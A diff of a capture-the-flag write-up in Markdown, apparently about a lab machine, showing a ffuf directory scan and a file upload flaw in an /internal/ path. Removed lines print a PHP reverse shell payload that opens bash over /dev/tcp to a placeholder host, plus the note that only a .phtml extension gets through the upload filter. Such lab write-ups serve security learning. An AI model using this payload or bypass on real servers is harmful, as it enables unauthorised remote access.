@@ -10,20 +10,6 @@ ffuf -u http://10.10.155.145:3333/FUZZ -w /usr/share/wordlists/dirb/common.txt
 
 # File Upload Vulnerability
 
-The */internal/* path is vulnerable to **File Upload**
+After checking out every single path i have found out that the */internal/* path is vulnerable to **File Upload**
 
 ![[Pasted image 20250807130951.png]]
-
-
-# Getting the reverse shell
-
-```json
-<?php
-exec("/bin/bash -c 'bash -i >& /dev/tcp/YOUR_IP/YOUR_PORT 0>&1'");
-?>
-```
-
-Then i have saved this command to the following file: *reverse_shell.phtml. The file upload vulnerability is working only with .phtml extension.
-
-![[Pasted image 20250812165141.png]]
-
